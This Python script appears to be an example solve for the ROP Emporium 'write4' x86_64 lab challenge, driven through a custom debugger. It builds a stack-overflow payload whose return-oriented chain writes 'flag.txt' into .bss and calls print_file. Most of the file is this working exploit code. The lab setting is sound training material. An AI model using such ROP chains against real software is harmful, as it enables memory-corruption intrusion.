"""ROP Emporium write4 on x86_64: memory-write chain through mydbg.

pwnme lives in libwrite4.so (an import), so the solve drives the module-base
flow: stop at __libc_csu_init (a static main-image address that runs after
the libraries map), read libwrite4.so's runtime base from the module list,
then place breakpoints inside the library at base+offset (offsets derived by
lifting the .so with angr). The chain writes "flag.txt" into .bss with the
`mov [r14], r15` gadget, then calls print_file(.bss).

    ./build/dev/mydbg --headless-script examples/rop_emporium/solve_write4_x64.py
"""

from __future__ import annotations

import struct

from mydbg import rop, symbolic

import emporium

PAD = 40  # 32-byte buffer + saved rbp


def run(dbg):
    if not symbolic.requires_angr():
        raise RuntimeError(symbolic.BOOTSTRAP_HINT)
    emporium.require_sysroots(("x64",))
    binary = emporium.challenge_path("x64", "write4")
    library = emporium.challenge_path("x64", "libwrite4.so")
    project = symbolic._entry_project(dbg, binary=binary)  # noqa: SLF001
    plt = project.loader.main_object.plt
    print_file_plt = plt["print_file"]

    engine = rop.RopEngine(binary)
    engine.find_gadgets()
    mov_write = engine.find_gadgets_matching("mov qword ptr [r14] , r15 ; ret",
                                             exact=True) or \
        [g for g in engine.gadgets()
         if "mov qword ptr [r14]" in engine.gadget_text(g) and "r15" in engine.gadget_text(g)]
    if not mov_write:
        raise RuntimeError("no memory-write gadget found")
    write_gadget = mov_write[0]
    pops = engine.find_gadgets_matching("pop r14 ; pop r15 ; ret", exact=True)[0]
    pop_rdi = engine.find_gadgets_matching("pop rdi ; ret", exact=True)[0]
    print(f"[+] write gadget: {engine.gadget_summary(write_gadget)}")
    print(f"[+] pops: {engine.gadget_summary(pops)} / {engine.gadget_summary(pop_rdi)}")

    # Where to plant "flag.txt": the target's .bss (static, non-PIE).
    bss = 0x601038
    for section in project.loader.main_object.sections:
        if section.name == ".bss":
            bss = section.vaddr
    print(f"[+] .bss at {bss:#x}, print_file@plt {print_file_plt:#x}")

    # The chain: pop r14=.bss, r15="flag.txt", write, pop rdi=.bss, print_file.
    chain = (struct.pack("<Q", pops.addr) + struct.pack("<Q", bss) +
             struct.pack("<Q", int.from_bytes(b"flag.txt", "little")) +
             struct.pack("<Q", write_gadget.addr) +
             struct.pack("<Q", pop_rdi.addr) + struct.pack("<Q", bss) +
             struct.pack("<Q", print_file_plt))
    payload = b"A" * PAD + chain

    process = emporium.qemu_connect(dbg, "x64", binary, payload=payload)

    # Stage 1: a static main-image breakpoint that runs after the libraries
    # map; the library base comes from the guest's own link_map (qemu-user's
    # stub does not report guest libraries as modules).
    csu = symbolic.resolve_project_symbol(project, "__libc_csu_init")
    dbg.set_breakpoint(f"{csu:#x}")
    result = dbg.continue_and_wait(timeout=30)
    if result.state != "stopped":
        raise RuntimeError("__libc_csu_init was not reached")
    library_base = emporium.library_base_via_link_map(dbg, "libwrite4")
    print(f"[+] libwrite4.so at {library_base:#x}")

    # Stage 2: breakpoints inside the library, from angr-derived offsets
    # relative to the .so's own mapping (cle loads it at its preferred base).
    library_project = symbolic._entry_project(dbg, binary=library)  # noqa: SLF001
    library_object = library_project.loader.main_object
    preferred = library_object.mapped_base
    pwnme = symbolic.resolve_project_symbol(library_project, "pwnme") - preferred
    after_read = (emporium.after_read_address_in_project(library_project) -
                  preferred)
    dbg.set_breakpoint(f"{library_base + pwnme:#x}")
    result = dbg.continue_and_wait(timeout=30)
    if result.state != "stopped":
        raise RuntimeError("pwnme (library) was not reached")
    print(f"[+] stopped at pwnme ({library_base + pwnme:#x})")
    dbg.set_breakpoint(f"{library_base + after_read:#x}")
    result = dbg.continue_and_wait(timeout=30)
    if result.state != "stopped":
        raise RuntimeError("the after-read stop was missed")
    print(f"[+] stopped after the read at {library_base + after_read:#x}")

    result = dbg.continue_and_wait(timeout=30)
    output = emporium.drain(process, seconds=5.0)
    lines = output.decode(errors="replace").splitlines()
    printed = [line for line in lines if "ROPE{" in line]
    if not printed:
        raise RuntimeError(f"write4 chain failed: {output[-200:]!r}")
    print("[+] write4-x64-solve-ok:", printed[-1])
